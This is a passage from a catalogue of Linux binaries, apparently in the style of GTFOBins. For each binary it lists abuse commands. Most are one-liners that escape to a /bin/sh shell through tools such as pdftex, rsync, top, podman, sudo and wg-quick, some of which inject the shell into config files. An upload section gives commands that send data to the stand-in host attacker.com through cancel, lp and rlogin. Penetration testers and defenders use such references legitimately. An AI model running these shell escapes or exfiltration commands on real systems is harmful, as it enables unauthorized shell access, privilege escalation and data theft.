rpm opkg install x_1.0_all.deb
```

#### pdftex
Linux binary 'pdftex' with exploitation functions: shell
**Categories:** shell
```
pdftex --shell-escape '\write18{/bin/sh}\end'
```

#### perf
Linux binary 'perf' with exploitation functions: shell
**Categories:** shell
```
perf stat /bin/sh
```

#### perlbug
Linux binary 'perlbug' with exploitation functions: shell
**Categories:** shell
```
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
```

#### pexec
Linux binary 'pexec' with exploitation functions: shell
**Categories:** shell
```
pexec /bin/sh
```

#### pidstat
Linux binary 'pidstat' with exploitation functions: shell
**Categories:** shell
```
pidstat -e /bin/sh
```

#### pkexec
Linux binary 'pkexec' with exploitation functions: shell
**Categories:** shell
```
pkexec /bin/sh
```

#### plymouth
Linux binary 'plymouth' with exploitation functions: shell
**Categories:** shell
```
plymouth ask-for-password --prompt=x --command=/bin/sh
```

#### podman
Linux binary 'podman' with exploitation functions: shell
**Categories:** shell
```
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```

#### posh
Linux binary 'posh' with exploitation functions: shell
**Categories:** shell
```
posh
```

#### psftp
Linux binary 'psftp' with exploitation functions: shell
**Categories:** shell
```
psftp
!/bin/sh
```

#### R
Linux binary 'R' with exploitation functions: shell
**Categories:** shell
```
R --no-save -e 'system("/bin/sh")'
```

#### ranger
Linux binary 'ranger' with exploitation functions: shell
**Categories:** shell
```
ranger
S
```

#### rc
Linux binary 'rc' with exploitation functions: shell
**Categories:** shell
```
rc
```

#### rsync
Linux binary 'rsync' with exploitation functions: shell
**Categories:** shell
```
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```

#### rtorrent
Linux binary 'rtorrent' with exploitation functions: shell
**Categories:** shell
```
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```

#### run-parts
Linux binary 'run-parts' with exploitation functions: shell
**Categories:** shell
```
run-parts --new-session --regex '^sh$' /bin
```

#### runscript
Linux binary 'runscript' with exploitation functions: shell
**Categories:** shell
```
echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file
```

#### sash
Linux binary 'sash' with exploitation functions: shell
**Categories:** shell
```
sash
```

#### scanmem
Linux binary 'scanmem' with exploitation functions: shell
**Categories:** shell
```
scanmem
shell /bin/sh
```

#### scrot
Linux binary 'scrot' with exploitation functions: shell
**Categories:** shell
```
scrot -e /bin/sh
```

#### service
Linux binary 'service' with exploitation functions: shell
**Categories:** shell
```
service ../../bin/sh
```

#### setarch
Linux binary 'setarch' with exploitation functions: shell
**Categories:** shell
```
setarch -3 /bin/sh
```

#### setlock
Linux binary 'setlock' with exploitation functions: shell
**Categories:** shell
```
setlock - /bin/sh
```

#### sg
Linux binary 'sg' with exploitation functions: shell
**Categories:** shell
```
sg $(id -ng)
```

#### slsh
Linux binary 'slsh' with exploitation functions: shell
**Categories:** shell
```
slsh -e 'system("/bin/sh")'
```

#### softlimit
Linux binary 'softlimit' with exploitation functions: shell
**Categories:** shell
```
softlimit /bin/sh
```

#### ssh-agent
Linux binary 'ssh-agent' with exploitation functions: shell
**Categories:** shell
```
ssh-agent /bin/sh
```

#### sshpass
Linux binary 'sshpass' with exploitation functions: shell
**Categories:** shell
```
sshpass /bin/sh
```

#### sshuttle
Linux binary 'sshuttle' with exploitation functions: shell
**Categories:** shell
```
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```

#### start-stop-daemon
Linux binary 'start-stop-daemon' with exploitation functions: shell
**Categories:** shell
```
start-stop-daemon -S -x /bin/sh
```

#### stdbuf
Linux binary 'stdbuf' with exploitation functions: shell
**Categories:** shell
```
stdbuf -i0 /bin/sh
```

#### su
Linux binary 'su' with exploitation functions: shell
**Categories:** shell
```
su -c /bin/sh
```

#### sudo
Linux binary 'sudo' with exploitation functions: shell
**Categories:** shell
```
sudo /bin/sh
```

#### task
Linux binary 'task' with exploitation functions: shell
**Categories:** shell
```
task execute /bin/sh
```

#### taskset
Linux binary 'taskset' with exploitation functions: shell
**Categories:** shell
```
taskset 1 /bin/sh
```

#### tasksh
Linux binary 'tasksh' with exploitation functions: shell
**Categories:** shell
```
tasksh
!/bin/sh
```

#### tdbtool
Linux binary 'tdbtool' with exploitation functions: shell
**Categories:** shell
```
tdbtool
! /bin/sh
```

#### tex
Linux binary 'tex' with exploitation functions: shell
**Categories:** shell
```
tex --shell-escape '\immediate\write18{/bin/sh}'
```

#### time
Linux binary 'time' with exploitation functions: shell
**Categories:** shell
```
time /bin/sh
```

#### timeout
Linux binary 'timeout' with exploitation functions: shell
**Categories:** shell
```
timeout 0 /bin/sh
```

#### tmate
Linux binary 'tmate' with exploitation functions: shell
**Categories:** shell
```
tmate -c /bin/sh
```

#### top
Linux binary 'top' with exploitation functions: shell
**Categories:** shell
```
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset
```

#### torify
Linux binary 'torify' with exploitation functions: shell
**Categories:** shell
```
torify /bin/sh
```

#### torsocks
Linux binary 'torsocks' with exploitation functions: shell
**Categories:** shell
```
torsocks /bin/sh
```

#### unshare
Linux binary 'unshare' with exploitation functions: shell
**Categories:** shell
```
unshare /bin/sh
```

#### uv
Linux binary 'uv' with exploitation functions: shell
**Categories:** shell
```
uv run /bin/sh
```

#### valgrind
Linux binary 'valgrind' with exploitation functions: shell
**Categories:** shell
```
valgrind /bin/sh
```

#### watch
Linux binary 'watch' with exploitation functions: shell
**Categories:** shell
```
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```

#### wg-quick
Linux binary 'wg-quick' with exploitation functions: shell
**Categories:** shell
```
cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf
```

#### xdg-user-dir
Linux binary 'xdg-user-dir' with exploitation functions: shell
**Categories:** shell
```
xdg-user-dir '}; /bin/sh #'
```

#### xdotool
Linux binary 'xdotool' with exploitation functions: shell
**Categories:** shell
```
xdotool exec --sync /bin/sh
```

#### yarn
Linux binary 'yarn' with exploitation functions: shell
**Categories:** shell
```
yarn exec /bin/sh
```

#### yash
Linux binary 'yash' with exploitation functions: shell
**Categories:** shell
```
yash
```

#### yt-dlp
Linux binary 'yt-dlp' with exploitation functions: shell
**Categories:** shell
```
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```

#### zathura
Linux binary 'zathura' with exploitation functions: shell
**Categories:** shell
```
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```

#### zypper
Linux binary 'zypper' with exploitation functions: shell
**Categories:** shell
```
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```

### Uncategorized

#### apt
Linux binary 'apt'

#### awk
Linux binary 'awk'

#### bundler
Linux binary 'bundler'

#### c89
Linux binary 'c89'

#### c99
Linux binary 'c99'

#### cc
Linux binary 'cc'

#### g++
Linux binary 'g++'

#### hd
Linux binary 'hd'

#### ksh
Linux binary 'ksh'

#### lastb
Linux binary 'lastb'

#### nawk
Linux binary 'nawk'

#### nvim
Linux binary 'nvim'

#### pico
Linux binary 'pico'

#### red
Linux binary 'red'

#### rview
Linux binary 'rview'

#### rvim
Linux binary 'rvim'

#### view
Linux binary 'view'

#### vimdiff
Linux binary 'vimdiff'

#### xelatex
Linux binary 'xelatex'

#### xetex
Linux binary 'xetex'

### upload

#### cancel
Linux binary 'cancel' with exploitation functions: upload
**Categories:** upload
```
cancel -h attacker.com:12345 -u DATA
```

#### lp
Linux binary 'lp' with exploitation functions: upload
**Categories:** upload
```
lp /path/to/input-file -h attacker.com
```

#### rlogin
Linux binary 'rlogin' with exploitation functions: upload
**Categories:** upload
```
rlogin -l DATA -p 12345 attacker.com
```

#### tailscale
Linux binary 'tailscale' with exploitation functions: upload
**Categories:** upload
```
tailscale serve --http=12345 /path/to/input-file
```
